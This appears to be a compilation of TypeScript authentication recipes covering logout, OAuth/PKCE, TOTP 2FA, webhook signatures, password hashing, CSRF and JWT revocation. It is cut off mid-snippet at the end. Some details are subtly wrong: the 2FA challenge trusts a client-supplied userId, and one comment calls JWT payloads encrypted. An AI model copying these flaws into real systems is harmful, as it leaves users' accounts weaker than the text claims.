A proper logout must invalidate the session server-side, clear client cookies, and revoke refresh tokens.

```typescript
// Server-side logout
app.post('/auth/logout', authenticate, async (req, res) => {
  const userId = req.user.id;

  // 1. Revoke current refresh token
  const refreshToken = req.cookies.refresh_token;
  if (refreshToken) {
    const hash = createHash('sha256').update(refreshToken).digest('hex');
    await db.refreshToken.updateMany({
      where: { tokenHash: hash },
      data: { revoked: true },
    });
  }

  // 2. Optionally invalidate ALL sessions ("logout everywhere")
  if (req.body.allDevices) {
    await db.session.deleteMany({ where: { userId } });
    await db.refreshToken.updateMany({
      where: { userId },
      data: { revoked: true },
    });
  }

  // 3. Clear cookies
  res.clearCookie('access_token', { httpOnly: true, secure: true, sameSite: 'strict' });
  res.clearCookie('refresh_token', {
    httpOnly: true, secure: true, sameSite: 'strict', path: '/auth/refresh',
  });
  res.clearCookie('session', { httpOnly: true, secure: true, sameSite: 'lax' });

  res.json({ success: true });
});

// Client-side:
async function logout(allDevices = false) {
  await fetch('/auth/logout', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({ allDevices }),
    headers: { 'Content-Type': 'application/json' },
  });

  // Clear any client-side state
  queryClient.clear(); // React Query
  // Or: store.dispatch(resetState()); // Redux
  window.location.href = '/login';
}
```

The `clearCookie` options must match the options used when setting the cookie (path, domain, sameSite). If they don't match, the cookie won't be deleted. Always do a full page navigation to `/login` after logout to clear any in-memory state.

Request minimal OAuth scopes at signup and ask for additional permissions when the user needs specific features.

```typescript
// Initial login — minimal scopes
const loginScopes = ['openid', 'profile', 'email'];

// When user wants to import contacts
const contactScopes = [...loginScopes, 'contacts.readonly'];

// When user wants to post on their behalf
const postScopes = [...loginScopes, 'https://www.googleapis.com/auth/calendar.events'];

// Progressive scope request
async function requestAdditionalScope(scope: string) {
  // Check if we already have this scope
  const currentScopes = await getCurrentUserScopes();
  if (currentScopes.includes(scope)) return;

  // Redirect to OAuth with include_granted_scopes
  const authUrl = new URL('https://accounts.google.com/o/oauth2/v2/auth');
  authUrl.searchParams.set('client_id', GOOGLE_CLIENT_ID);
  authUrl.searchParams.set('scope', scope);
  authUrl.searchParams.set('include_granted_scopes', 'true'); // Keep existing scopes
  authUrl.searchParams.set('prompt', 'consent'); // Show consent for new scope
  authUrl.searchParams.set('access_type', 'offline');
  authUrl.searchParams.set('response_type', 'code');
  authUrl.searchParams.set('redirect_uri', `${APP_URL}/api/auth/scope-upgrade/callback`);
  authUrl.searchParams.set('state', JSON.stringify({ returnTo: window.location.pathname }));

  window.location.href = authUrl.toString();
}

// In the UI
function ImportContactsButton() {
  return (
    <button onClick={() => requestAdditionalScope('contacts.readonly')}>
      Connect Contacts (requires permission)
    </button>
  );
}
```

Google's `include_granted_scopes` preserves existing permissions. Other providers may not support incremental authorization — you may need to request all needed scopes at once and store/revoke token as needed.

Full implementation of TOTP two-factor authentication including QR code generation, verification, and recovery codes.

```typescript
import { authenticator } from 'otplib';
import QRCode from 'qrcode';
import { hash, verify } from 'argon2';
import { randomBytes, createHash } from 'crypto';

// Step 1: Generate 2FA secret and QR code
app.post('/api/2fa/setup', authenticate, async (req, res) => {
  const secret = authenticator.generateSecret();

  // Generate 10 recovery codes
  const recoveryCodes = Array.from({ length: 10 }, () =>
    randomBytes(4).toString('hex').toUpperCase().match(/.{4}/g)!.join('-')
  );

  // Hash recovery codes before storing
  const hashedCodes = await Promise.all(
    recoveryCodes.map(async (code) => ({
      hash: createHash('sha256').update(code).digest('hex'),
      used: false,
    }))
  );

  // Store secret temporarily (not activated yet)
  await db.user.update({
    where: { id: req.user.id },
    data: { pendingTotpSecret: secret, recoveryCodes: hashedCodes },
  });

  const otpauthUrl = authenticator.keyuri(req.user.email, 'MyApp', secret);
  const qrCode = await QRCode.toDataURL(otpauthUrl);

  res.json({ qrCode, secret, recoveryCodes });
});

// Step 2: Verify and activate 2FA
app.post('/api/2fa/verify', authenticate, async (req, res) => {
  const { code } = req.body;
  const user = await db.user.findUnique({ where: { id: req.user.id } });

  if (!user?.pendingTotpSecret) {
    return res.status(400).json({ error: '2FA setup not initiated' });
  }

  const isValid = authenticator.verify({ token: code, secret: user.pendingTotpSecret });
  if (!isValid) {
    return res.status(400).json({ error: 'Invalid code. Try again.' });
  }

  await db.user.update({
    where: { id: req.user.id },
    data: { totpSecret: user.pendingTotpSecret, pendingTotpSecret: null, twoFactorEnabled: true },
  });

  res.json({ success: true });
});

// Step 3: Login with 2FA
app.post('/api/2fa/challenge', async (req, res) => {
  const { userId, code } = req.body;
  const user = await db.user.findUnique({ where: { id: userId } });

  // Try TOTP code first
  if (authenticator.verify({ token: code, secret: user!.totpSecret! })) {
    return issueTokens(user!, res);
  }

  // Try recovery code
  const normalizedCode = code.toUpperCase().replace(/\s/g, '');
  const codeHash = createHash('sha256').update(normalizedCode).digest('hex');
  const codes = user!.recoveryCodes as { hash: string; used: boolean }[];
  const matchIdx = codes.findIndex(c => !c.used && c.hash === codeHash);

  if (matchIdx >= 0) {
    codes[matchIdx].used = true;
    await db.user.update({ where: { id: userId }, data: { recoveryCodes: codes } });
    return issueTokens(user!, res);
  }

  res.status(401).json({ error: 'Invalid 2FA code' });
});
```

The two-step activation (generate then verify) ensures the user's authenticator app is set up correctly before locking them in. Recovery codes use simple SHA-256 hashing since they're high-entropy random strings. Always show remaining recovery code count to the user.

Server-side middleware that transparently refreshes expired access tokens and retries the original request.

```typescript
import jwt from 'jsonwebtoken';

interface AuthenticatedRequest extends Request {
  user: { id: string; role: string };
}

async function authMiddleware(
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
) {
  const accessToken = req.cookies.access_token;
  const refreshToken = req.cookies.refresh_token;

  // Try access token first
  if (accessToken) {
    try {
      req.user = jwt.verify(accessToken, process.env.ACCESS_SECRET!) as any;
      return next();
    } catch (err) {
      if (!(err instanceof jwt.TokenExpiredError)) {
        return res.status(401).json({ error: 'Invalid token' });
      }
      // Token expired — fall through to refresh
    }
  }

  // Try refresh token
  if (!refreshToken) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  try {
    const payload = jwt.verify(refreshToken, process.env.REFRESH_SECRET!) as any;

    // Verify refresh token hasn't been revoked
    const stored = await db.refreshToken.findFirst({
      where: { userId: payload.sub, tokenHash: hashToken(refreshToken), revoked: false },
    });
    if (!stored) return res.status(401).json({ error: 'Token revoked' });

    // Issue new tokens
    const newAccess = jwt.sign(
      { id: payload.sub, role: payload.role },
      process.env.ACCESS_SECRET!,
      { expiresIn: '15m' }
    );

    res.cookie('access_token', newAccess, {
      httpOnly: true, secure: true, sameSite: 'strict',
      maxAge: 15 * 60 * 1000,
    });

    req.user = { id: payload.sub, role: payload.role };
    next();
  } catch {
    res.clearCookie('access_token');
    res.clearCookie('refresh_token');
    res.status(401).json({ error: 'Session expired' });
  }
}
```

This middleware transparently handles token refresh — the client doesn't need to implement refresh logic. The new access token is set as a cookie in the response, so the next request from the client will use the fresh token. This works because cookies are set before the route handler sends its response.

Verify that incoming webhooks are authentic by validating their signatures.

```typescript
import { createHmac, timingSafeEqual } from 'crypto';

// Generic HMAC signature verification
function verifyHmacSignature(
  payload: string | Buffer,
  signature: string,
  secret: string,
  algorithm: string = 'sha256'
): boolean {
  const expected = createHmac(algorithm, secret)
    .update(payload)
    .digest('hex');

  return timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expected)
  );
}

// Stripe webhook verification
import Stripe from 'stripe';

app.post('/webhooks/stripe',
  express.raw({ type: 'application/json' }), // Must use raw body!
  async (req, res) => {
    const sig = req.headers['stripe-signature']!;
    try {
      const event = stripe.webhooks.constructEvent(
        req.body,
        sig,
        process.env.STRIPE_WEBHOOK_SECRET!
      );
      await handleStripeEvent(event);
      res.json({ received: true });
    } catch (err) {
      res.status(400).json({ error: `Webhook Error: ${err.message}` });
    }
  }
);

// GitHub webhook verification
app.post('/webhooks/github',
  express.raw({ type: 'application/json' }),
  async (req, res) => {
    const signature = req.headers['x-hub-signature-256'] as string;
    const expected = 'sha256=' + createHmac('sha256', process.env.GITHUB_WEBHOOK_SECRET!)
      .update(req.body)
      .digest('hex');

    if (!timingSafeEqual(Buffer.from(signature), Buffer.from(expected))) {
      return res.status(401).json({ error: 'Invalid signature' });
    }

    const event = JSON.parse(req.body);
    await handleGitHubEvent(event);
    res.json({ received: true });
  }
);
```

Critical: use `express.raw()` for webhook routes — `express.json()` parses the body, and signature verification needs the raw bytes. The signature must be compared using `timingSafeEqual` to prevent timing attacks.

Migrate from bcrypt to argon2 without forcing all users to reset passwords.

```typescript
import { hash as argon2Hash, verify as argon2Verify, needsRehash } from 'argon2';
import bcrypt from 'bcrypt';

// Detect hash type by prefix
function isBcryptHash(hash: string): boolean {
  return hash.startsWith('$2a$') || hash.startsWith('$2b$') || hash.startsWith('$2y$');
}

function isArgon2Hash(hash: string): boolean {
  return hash.startsWith('$argon2');
}

// Verify password against any hash type
async function verifyPassword(password: string, storedHash: string): Promise<boolean> {
  if (isBcryptHash(storedHash)) {
    return bcrypt.compare(password, storedHash);
  }
  if (isArgon2Hash(storedHash)) {
    return argon2Verify(storedHash, password);
  }
  throw new Error(`Unknown hash format: ${storedHash.slice(0, 10)}...`);
}

// Login with transparent rehashing
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await db.user.findUnique({ where: { email } });
  if (!user) {
    await argon2Hash('dummy'); // Prevent timing-based enumeration
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const isValid = await verifyPassword(password, user.password);
  if (!isValid) return res.status(401).json({ error: 'Invalid credentials' });

  // Rehash with argon2 if still using bcrypt (or if argon2 params changed)
  const shouldRehash = isBcryptHash(user.password) ||
    (isArgon2Hash(user.password) && needsRehash(user.password));

  if (shouldRehash) {
    const newHash = await argon2Hash(password, {
      type: 2,         // argon2id
      memoryCost: 65536, // 64MB
      timeCost: 3,
      parallelism: 4,
    });
    await db.user.update({ where: { id: user.id }, data: { password: newHash } });
  }

  // Issue tokens...
});
```

This approach migrates users transparently — the hash is upgraded to argon2id the next time they log in. Track migration progress by counting bcrypt vs argon2 hashes in the database. Set a deadline to force remaining users to reset their passwords.

Protect Next.js Server Components and Server Actions with session validation.

```typescript
// lib/auth.ts
import { cookies } from 'next/headers';
import { redirect } from 'next/navigation';
import { cache } from 'react';
import { jwtVerify } from 'jose';

export interface AuthUser {
  id: string;
  email: string;
  role: string;
}

// Cache per-request to avoid re-verifying on every component
export const getUser = cache(async (): Promise<AuthUser | null> => {
  const cookieStore = cookies();
  const token = cookieStore.get('access_token')?.value;
  if (!token) return null;

  try {
    const secret = new TextEncoder().encode(process.env.JWT_SECRET!);
    const { payload } = await jwtVerify(token, secret);
    return {
      id: payload.sub as string,
      email: payload.email as string,
      role: payload.role as string,
    };
  } catch {
    return null;
  }
});

// Require auth — redirects to login if not authenticated
export async function requireAuth(): Promise<AuthUser> {
  const user = await getUser();
  if (!user) redirect('/login');
  return user;
}

// Require specific role
export async function requireRole(...roles: string[]): Promise<AuthUser> {
  const user = await requireAuth();
  if (!roles.includes(user.role)) redirect('/unauthorized');
  return user;
}

// Usage in Server Component
export default async function DashboardPage() {
  const user = await requireAuth();
  return <div>Welcome, {user.email}</div>;
}

// Usage in Server Action
export async function updateProfile(formData: FormData) {
  'use server';
  const user = await requireAuth();
  await db.user.update({
    where: { id: user.id },
    data: { name: formData.get('name') as string },
  });
  revalidatePath('/profile');
}
```

The `cache()` wrapper ensures `getUser()` only runs once per request, even if called from multiple components. `redirect()` throws a special error that Next.js catches — it works in both Server Components and Server Actions.

iron-session provides encrypted, stateless sessions stored in cookies — no database or Redis needed.

```typescript
// lib/session.ts
import { getIronSession, SessionOptions } from 'iron-session';
import { cookies } from 'next/headers';

export interface SessionData {
  userId?: string;
  role?: string;
  isLoggedIn: boolean;
}

export const sessionOptions: SessionOptions = {
  password: process.env.SESSION_SECRET!, // Minimum 32 characters
  cookieName: 'myapp_session',
  cookieOptions: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    sameSite: 'lax',
    maxAge: 60 * 60 * 24 * 7, // 1 week
  },
};

export async function getSession() {
  const session = await getIronSession<SessionData>(cookies(), sessionOptions);
  return session;
}

// Login Server Action
export async function login(formData: FormData) {
  'use server';
  const email = formData.get('email') as string;
  const password = formData.get('password') as string;

  const user = await authenticateUser(email, password);
  if (!user) return { error: 'Invalid credentials' };

  const session = await getSession();
  session.userId = user.id;
  session.role = user.role;
  session.isLoggedIn = true;
  await session.save(); // Encrypts and sets cookie

  redirect('/dashboard');
}

// Logout
export async function logout() {
  'use server';
  const session = await getSession();
  session.destroy(); // Clears the cookie
  redirect('/login');
}

// Use in Server Component
export default async function ProfilePage() {
  const session = await getSession();
  if (!session.isLoggedIn) redirect('/login');

  const user = await db.user.findUnique({ where: { id: session.userId } });
  return <div>{user?.name}</div>;
}
```

iron-session encrypts the entire session payload into the cookie using AES-256-GCM. The 4KB cookie size limit means you should only store IDs and flags — not full user objects. No server-side state means instant horizontal scaling, but you can't invalidate individual sessions without a blocklist.

Client-side PKCE implementation for SPAs that handles the full OAuth flow without a backend secret.

```typescript
// lib/oauth.ts
async function generateCodeVerifier(): Promise<string> {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return base64UrlEncode(array);
}

async function generateCodeChallenge(verifier: string): Promise<string> {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const digest = await crypto.subtle.digest('SHA-256', data);
  return base64UrlEncode(new Uint8Array(digest));
}

function base64UrlEncode(buffer: Uint8Array): string {
  return btoa(String.fromCharCode(...buffer))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

// Initiate login
export async function startOAuthLogin() {
  const codeVerifier = await generateCodeVerifier();
  const codeChallenge = await generateCodeChallenge(codeVerifier);
  const state = crypto.randomUUID();

  // Store in sessionStorage (survives redirect)
  sessionStorage.setItem('oauth_code_verifier', codeVerifier);
  sessionStorage.setItem('oauth_state', state);

  const params = new URLSearchParams({
    response_type: 'code',
    client_id: OAUTH_CLIENT_ID,
    redirect_uri: `${window.location.origin}/callback`,
    scope: 'openid profile email',
    state,
    code_challenge: codeChallenge,
    code_challenge_method: 'S256',
  });

  window.location.href = `${OAUTH_AUTHORIZE_URL}?${params}`;
}

// Handle callback
export async function handleOAuthCallback(): Promise<TokenResponse> {
  const params = new URLSearchParams(window.location.search);
  const code = params.get('code');
  const state = params.get('state');

  const storedState = sessionStorage.getItem('oauth_state');
  const codeVerifier = sessionStorage.getItem('oauth_code_verifier');

  // Clean up
  sessionStorage.removeItem('oauth_state');
  sessionStorage.removeItem('oauth_code_verifier');

  if (!code || state !== storedState || !codeVerifier) {
    throw new Error('OAuth callback validation failed');
  }

  const response = await fetch(OAUTH_TOKEN_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code,
      redirect_uri: `${window.location.origin}/callback`,
      client_id: OAUTH_CLIENT_ID,
      code_verifier: codeVerifier,
    }),
  });

  return response.json();
}
```

The Web Crypto API (`crypto.subtle.digest`) is available in all modern browsers for generating the SHA-256 challenge. `sessionStorage` persists through the redirect but is cleared when the tab closes. Never use `localStorage` for the code verifier — it persists too long.

Use Supabase Auth with RLS policies to enforce authorization at the database level.

```typescript
// lib/supabase/server.ts
import { createServerClient } from '@supabase/ssr';
import { cookies } from 'next/headers';

export function createClient() {
  const cookieStore = cookies();
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    {
      cookies: {
        getAll: () => cookieStore.getAll(),
        setAll: (cookiesToSet) => {
          cookiesToSet.forEach(({ name, value, options }) =>
            cookieStore.set(name, value, options)
          );
        },
      },
    }
  );
}

// Server Component
export default async function PostsPage() {
  const supabase = createClient();
  const { data: { user } } = await supabase.auth.getUser();

  if (!user) redirect('/login');

  // RLS automatically filters: only returns posts this user can see
  const { data: posts } = await supabase
    .from('posts')
    .select('*')
    .order('created_at', { ascending: false });

  return <PostList posts={posts || []} />;
}
```

```sql
-- Supabase SQL: RLS policies
alter table posts enable row level security;

-- Users can read their own posts
create policy "Users can read own posts" on posts
  for select using (auth.uid() = user_id);

-- Users can insert their own posts
create policy "Users can create posts" on posts
  for insert with check (auth.uid() = user_id);

-- Users can update their own posts
create policy "Users can update own posts" on posts
  for update using (auth.uid() = user_id);

-- Admins can read all posts
create policy "Admins can read all" on posts
  for select using (
    exists (
      select 1 from user_roles
      where user_roles.user_id = auth.uid()
      and user_roles.role = 'admin'
    )
  );
```

RLS enforces authorization at the database level — even if your application code has a bug, unauthorized data access is impossible. Always use `getUser()` (server-verified) not `getSession()` (client-provided JWT) for auth checks in Server Components.

Auth.js v5 brings a simplified API, edge runtime support, and first-class Next.js integration.

```typescript
// auth.ts (root of project)
import NextAuth from 'next-auth';
import Google from 'next-auth/providers/google';
import GitHub from 'next-auth/providers/github';
import Credentials from 'next-auth/providers/credentials';
import { PrismaAdapter } from '@auth/prisma-adapter';
import { prisma } from '@/lib/prisma';

export const { handlers, signIn, signOut, auth } = NextAuth({
  adapter: PrismaAdapter(prisma),
  providers: [
    Google,           // Auto-reads GOOGLE_CLIENT_ID, GOOGLE_CLIENT_SECRET
    GitHub,           // Auto-reads GITHUB_CLIENT_ID, GITHUB_CLIENT_SECRET
    Credentials({
      authorize: async (credentials) => {
        // validate and return user
      },
    }),
  ],
  callbacks: {
    authorized({ auth, request: { nextUrl } }) {
      const isLoggedIn = !!auth?.user;
      const isProtected = nextUrl.pathname.startsWith('/dashboard');
      if (isProtected && !isLoggedIn) {
        return Response.redirect(new URL('/login', nextUrl));
      }
      return true;
    },
  },
});

// app/api/auth/[...nextauth]/route.ts
import { handlers } from '@/auth';
export const { GET, POST } = handlers;

// middleware.ts
import { auth } from '@/auth';
export default auth;
export const config = { matcher: ['/dashboard/:path*', '/admin/:path*'] };

// Server Component usage
import { auth } from '@/auth';

export default async function Page() {
  const session = await auth();
  if (!session) return <SignIn />;
  return <p>Hello {session.user?.name}</p>;
}

// Server Action
import { signIn, signOut } from '@/auth';

export async function handleSignIn() {
  'use server';
  await signIn('google');
}
```

Auth.js v5 exports `auth()` as a universal function — works in Server Components, API routes, middleware, and Server Actions. Provider configuration is auto-detected from environment variables following the `{PROVIDER}_CLIENT_ID` convention. The `authorized` callback replaces the need for separate middleware logic.

Clerk provides drop-in authentication with pre-built UI components and server-side helpers.

```typescript
// middleware.ts
import { clerkMiddleware, createRouteMatcher } from '@clerk/nextjs/server';

const isProtectedRoute = createRouteMatcher(['/dashboard(.*)', '/api(.*)']);
const isAdminRoute = createRouteMatcher(['/admin(.*)']);

export default clerkMiddleware(async (auth, req) => {
  if (isAdminRoute(req)) {
    const { sessionClaims } = await auth();
    if (sessionClaims?.metadata?.role !== 'admin') {
      return new Response('Forbidden', { status: 403 });
    }
  }
  if (isProtectedRoute(req)) {
    await auth.protect(); // Redirects to sign-in if not authenticated
  }
});

export const config = { matcher: ['/((?!_next|[^?]*\\.(?:html?|css|js)).*)'] };

// Server Component
import { currentUser } from '@clerk/nextjs/server';

export default async function DashboardPage() {
  const user = await currentUser();
  return (
    <div>
      <h1>Welcome, {user?.firstName}</h1>
      <p>Email: {user?.emailAddresses[0]?.emailAddress}</p>
    </div>
  );
}

// API Route with auth
import { auth } from '@clerk/nextjs/server';

export async function GET() {
  const { userId } = await auth();
  if (!userId) return new Response('Unauthorized', { status: 401 });

  const data = await db.post.findMany({ where: { authorId: userId } });
  return Response.json(data);
}
```

Clerk handles the entire auth UX (sign-up, sign-in, profile management, MFA) with customizable components. User metadata for RBAC is set via Clerk Dashboard or API. The `auth()` function is lightweight — it reads from the verified session cookie, no database call needed.

Implement CSRF protection for APIs using the double-submit cookie pattern — works without server-side state.

```typescript
import { createHmac, randomBytes } from 'crypto';

const CSRF_SECRET = process.env.CSRF_SECRET!;

// Generate CSRF token
function generateCsrfToken(): { cookie: string; header: string } {
  const nonce = randomBytes(32).toString('hex');
  const signature = createHmac('sha256', CSRF_SECRET).update(nonce).digest('hex');
  const token = `${nonce}.${signature}`;
  return { cookie: token, header: token };
}

// Set CSRF cookie on page load
app.get('/api/csrf-token', (req, res) => {
  const { cookie, header } = generateCsrfToken();

  res.cookie('csrf_token', cookie, {
    httpOnly: false,  // Must be readable by JavaScript!
    secure: true,
    sameSite: 'strict',
    maxAge: 60 * 60 * 1000, // 1 hour
  });

  res.json({ csrfToken: header });
});

// Validate CSRF on mutations
function csrfProtection(req: Request, res: Response, next: NextFunction) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  const cookieToken = req.cookies.csrf_token;
  const headerToken = req.headers['x-csrf-token'] as string;

  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }

  // Verify signature
  const [nonce, signature] = cookieToken.split('.');
  const expected = createHmac('sha256', CSRF_SECRET).update(nonce).digest('hex');
  if (signature !== expected) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  next();
}

// Client usage
const csrfToken = getCookie('csrf_token'); // Read from cookie
fetch('/api/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken, // Send in header too
  },
  credentials: 'include', // Send cookies
  body: JSON.stringify(data),
});
```

The double-submit pattern works because: 1) Cross-origin JavaScript can't read cookies from another domain (same-origin policy), 2) So an attacker can't set the matching header, 3) The HMAC prevents cookie tampering. This is stateless — no server-side token storage needed.

JWTs can't be revoked natively because they're stateless. Use a Redis blocklist for immediate invalidation when needed.

```typescript
import Redis from 'ioredis';
import jwt from 'jsonwebtoken';

const redis = new Redis(process.env.REDIS_URL!);
const BLOCKLIST_PREFIX = 'jwt:blocked:';

// Revoke a specific token
async function revokeToken(token: string): Promise<void> {
  const decoded = jwt.decode(token) as jwt.JwtPayload;
  if (!decoded?.jti || !decoded?.exp) return;

  const ttl = decoded.exp - Math.floor(Date.now() / 1000);
  if (ttl > 0) {
    // Only store until token would expire naturally
    await redis.set(`${BLOCKLIST_PREFIX}${decoded.jti}`, '1', 'EX', ttl);
  }
}

// Revoke all tokens for a user (on password change, account compromise)
async function revokeAllUserTokens(userId: string): Promise<void> {
  await redis.set(`jwt:revoke_before:${userId}`, Math.floor(Date.now() / 1000), 'EX', 86400);
}

// Enhanced verify function
async function verifyToken(token: string): Promise<jwt.JwtPayload> {
  const payload = jwt.verify(token, process.env.JWT_SECRET!, {
    algorithms: ['HS256'],
  }) as jwt.JwtPayload;

  // Check individual token blocklist
  if (payload.jti) {
    const blocked = await redis.exists(`${BLOCKLIST_PREFIX}${payload.jti}`);
    if (blocked) throw new Error('Token has been revoked');
  }

  // Check user-level revocation
  const revokedBefore = await redis.get(`jwt:revoke_before:${payload.sub}`);
  if (revokedBefore && payload.iat! < parseInt(revokedBefore)) {
    throw new Error('Token revoked — issued before revocation timestamp');
  }

  return payload;
}

// Always include jti in tokens for revocability
function signToken(userId: string): string {
  return jwt.sign(
    { sub: userId, jti: crypto.randomUUID() },
    process.env.JWT_SECRET!,
    { expiresIn: '15m' }
  );
}
```

The blocklist entry's TTL matches the token's remaining lifetime — entries auto-expire when the token would have expired anyway, keeping the blocklist small. For user-level revocation, store a `revoke_before` timestamp and reject any token issued before that time.

Three major password hashing algorithms with different strengths and trade-offs.

```typescript
// bcrypt — battle-tested, widely supported
import bcrypt from 'bcrypt';
const hash = await bcrypt.hash(password, 12);
const valid = await bcrypt.compare(password, hash);
// Output: $2b$12$LJ3m4ys3Lg5Nl6JtGFMwAOoFvLzAWn7n5G...

// argon2id — winner of Password Hashing Competition (2015)
import { hash, verify } from 'argon2';
const hashed = await hash(password, {
  type: 2,           // argon2id (recommended)
  memoryCost: 65536, // 64 MB
  timeCost: 3,       // 3 iterations
  parallelism: 4,    // 4 threads
});
const valid = await verify(hashed, password);
// Output: $argon2id$v=19$m=65536,t=3,p=4$...

// scrypt — used by Ethereum, built into Node.js
import { scrypt, randomBytes } from 'crypto';
const salt = randomBytes(16);
scrypt(password, salt, 64, (err, derivedKey) => {
  const hash = salt.toString('hex') + ':' + derivedKey.toString('hex');
});
```

| Feature | bcrypt | argon2id | scrypt |
|---------|--------|----------|--------|
| Memory-hard | No (4KB fixed) | Yes (configurable) | Yes (configurable) |
| GPU-resistant | Moderate | High | High |
| Max input | 72 bytes | Unlimited | Unlimited |
| Native Node.js | No (native addon) | No (native addon) | Yes (crypto module) |
| OWASP recommended | Yes (legacy) | Yes (preferred) | Yes |
| Configuration | Cost factor only | Memory, time, parallelism | N, r, p |

**Recommendation:** Use argon2id for new projects — it's the OWASP-recommended choice with configurable memory hardness that resists both GPU and ASIC attacks. Use bcrypt if argon2 is unavailable (serverless/edge). Use scrypt if you need zero dependencies (built into Node.js crypto module).

Four popular authentication solutions for Next.js with different trade-offs in control, features, and pricing.

```typescript
// NextAuth.js (Auth.js) — open source, self-hosted
import NextAuth from 'next-auth';
import Google from 'next-auth/providers/google';
export const { auth, handlers } = NextAuth({ providers: [Google] });

// Clerk — managed service with pre-built UI
import { clerkMiddleware } from '@clerk/nextjs/server';
export default clerkMiddleware();

// Supabase Auth — part of Supabase BaaS
import { createClient } from '@supabase/supabase-js';
const { data } = await supabase.auth.signInWithOAuth({ provider: 'google' });

// Lucia — lightweight, full control
import { Lucia } from 'lucia';
import { PrismaAdapter } from '@lucia-auth/adapter-prisma';
export const lucia = new Lucia(new PrismaAdapter(prisma));
```

| Feature | NextAuth.js | Clerk | Supabase Auth | Lucia |
|---------|-------------|-------|---------------|-------|
| Type | Open source lib | Managed service | BaaS feature | Open source lib |
| Pricing | Free | Free→$25/mo | Free→$25/mo | Free |
| UI components | None | Full suite | Pre-built | None |
| Edge runtime | v5 yes | Yes | Yes | Yes |
| Database | Your choice | Managed | Managed | Your choice |
| Social providers | 60+ | 20+ | 15+ | Manual |
| MFA/2FA | Manual | Built-in | Built-in | Manual |
| User management | Manual | Dashboard | Dashboard | Manual |
| Data ownership | Full | Clerk-hosted | Supabase-hosted | Full |
| Learning curve | Medium | Low | Low | Higher |

**Choose NextAuth.js** for: maximum flexibility with good DX, many OAuth providers, self-hosted. **Choose Clerk** for: fastest time-to-ship, pre-built UI, need user management dashboard. **Choose Supabase Auth** for: already using Supabase, need RLS integration, want BaaS. **Choose Lucia** for: maximum control, lightweight, understand auth deeply.

Two fundamentally different approaches to maintaining authentication state.

**Session-based (stateful):**
```typescript
// Server stores session data
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET!,
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, secure: true, maxAge: 86400000 },
}));

app.post('/login', (req, res) => {
  req.session.userId = user.id; // Stored in Redis
  res.json({ success: true });
  // Cookie: session=s%3AaBC123... (encrypted session ID)
});
```

**JWT-based (stateless):**
```typescript
app.post('/login', (req, res) => {
  const token = jwt.sign(
    { sub: user.id, role: user.role },
    process.env.JWT_SECRET!,
    { expiresIn: '15m' }
  );
  res.cookie('token', token, { httpOnly: true, secure: true });
  // Cookie contains the entire auth payload, encrypted
});
```

| Aspect | Session-based | JWT-based |
|--------|--------------|----------|
| State | Server (Redis/DB) | Client (cookie/header) |
| Revocation | Instant (delete session) | Hard (need blocklist) |
| Scaling | Needs shared store | Stateless — any server |
| Size | ~32 byte session ID | ~800+ byte token |
| Security | Session ID = opaque | Payload visible (not encrypted) |
| Microservices | Needs session store access | Any service can verify |
| Mobile clients | Cookie management tricky | Token in header works |

**Use sessions when:** you need instant revocation, have a monolithic app, or want simplicity. **Use JWTs when:** you have microservices, need cross-domain auth, or can't maintain shared state. **Hybrid approach:** JWT access tokens (15m, stateless) + session-based refresh tokens (7d, stored in DB).

OAuth 2.0 defines multiple flows (grant types) for different client types.

```
// Authorization Code + PKCE (web apps, SPAs, mobile)
GET /authorize?response_type=code&code_challenge=CHALLENGE...
POST /token { grant_type: "authorization_code", code, code_verifier }

// Client Credentials (machine-to-machine)
POST /token { grant_type: "client_credentials", client_id, client_secret, scope }

// Device Code (smart TVs, CLI tools)
POST /device/code { client_id, scope }
// User visits URL and enters code on another device
POST /token { grant_type: "urn:ietf:params:oauth:grant-type:device_code", device_code }
```

| Grant Type | Client Type | Use Case |
|------------|-------------|----------|
| Authorization Code + PKCE | Web apps, SPAs, mobile | User login via browser redirect |
| Client Credentials | Backend services, APIs | Service-to-service auth (no user) |
| Device Code | Smart TVs, CLI, IoT | Devices without a browser |
| Refresh Token | All (with refresh) | Extend session without re-auth |
| ~~Implicit~~ | ~~SPAs~~ | **DEPRECATED** — use Auth Code + PKCE |
| ~~Password~~ | ~~Trusted first-party~~ | **DEPRECATED** — use Auth Code + PKCE |

**Authorization Code + PKCE** is the universal recommendation for any client that interacts with a user. **Client Credentials** is for automated backend processes (cron jobs, microservices). **Device Code** is for devices that can display a URL and code but can't open a browser (Apple TV, CLI tools like `gh auth login`).

Helmet.js sets HTTP security headers that complement authentication by preventing XSS, clickjacking, and other attacks.

```typescript
import helmet from 'helmet';

app.use(helmet({
  // Content Security Policy — prevents XSS
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-{RANDOM}'"], // Use nonces, not unsafe-inline
      styleSrc: ["'self'", "'unsafe-inline'"],   // Needed for most CSS-in-JS
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://api.myapp.com'],
      frameSrc: ["'none'"],                      // Prevent iframe embedding
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  // Prevent clickjacking
  frameguard: { action: 'deny' },
  // Force HTTPS
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
